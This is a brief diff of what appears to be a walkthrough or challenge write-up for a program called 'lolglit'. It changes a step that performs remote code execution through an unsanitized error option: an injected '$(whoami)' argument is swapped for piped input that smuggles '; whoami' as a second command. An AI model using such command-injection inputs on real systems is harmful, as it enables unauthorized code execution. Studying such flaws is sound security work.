@@ -5,5 +5,5 @@
 3. Use the unsanitized error option to perform RCE
 
 ```
-echo "aoeu > /tmp/a/" |  ./lolglit -e \$\(whoami\)
+echo "Jack > /tmp/a/a/a; whoami" | ./lolglit 
 ```
